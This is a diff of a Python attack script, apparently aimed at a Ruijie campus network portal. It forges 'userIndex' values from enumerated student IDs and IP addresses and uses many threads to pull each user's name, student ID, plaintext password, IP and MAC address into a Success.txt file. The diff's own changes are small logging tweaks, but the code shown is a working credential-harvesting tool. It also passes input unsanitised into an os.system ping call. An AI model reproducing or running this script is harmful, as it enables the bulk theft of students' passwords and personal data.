@@ -25,7 +25,7 @@ def code(str):
     return (result)
 
 
-def userIndex_make(ip):
+def userIndex_make(ip,ip_ping):
     # 第一串固定字符(暂未知晓是什么，怀疑是锐捷的设备序列号一类的)_用于构造userIndex
     theFristStr = "3131373364373830303233616635663237303561633566383037623464363831"
     print("[+] 已成功定义固定的字符串值...\n" + theFristStr)
@@ -52,9 +52,9 @@ def userIndex_make(ip):
                 for num in list_num:
                     stu_num_0 = str(year) + str(major) + str(clas) + str(num).zfill(2)
                     print("[+]当前测试的账号为:"+ stu_num_0)
+                    print("[+]当前测试的IP为:"+ ip_ping)
                     stu_num = code(stu_num_0)
                     userIndex = theFristStr + "5f" + ip + "5f" + stu_num
-                    print(userIndex)
                     yield userIndex
 
 
@@ -72,8 +72,8 @@ def run(gen):
             print("[+] 获取用户信息成功")
             print(infom)
             jsinfo = json.loads(infom)
-            result = "\t姓名" + jsinfo["userName"] + "\t学号" + jsinfo["userId"] + "密码" + jsinfo["password"] + "IP地址" + \
-                     jsinfo["userIp"] + "MAC地址" + jsinfo["userMac"] + "服务类型" + jsinfo["service"]
+            result = "\t姓名:" + jsinfo["userName"] + "\t学号:" + jsinfo["userId"] + "\t密码:" + jsinfo["password"] + "\tIP地址:" + \
+                     jsinfo["userIp"] + "\tMAC地址:" + jsinfo["userMac"] + "\t服务类型:" + jsinfo["service"]
             print(result)
             with open("Success.txt", "a", encoding="utf-8") as file:
                 file.write(result + "\n")
@@ -97,7 +97,7 @@ if __name__ == '__main__':
                     net = os.system("ping " + ip_ping)
                     if net == 0:
                         ip = code(ip_ping)
-                        userIndex = userIndex_make(ip)
+                        userIndex = userIndex_make(ip,ip_ping)
                         threads = []
                         for i in range(threadNum):
                             thread = threading.Thread(target=run, args=(userIndex,))
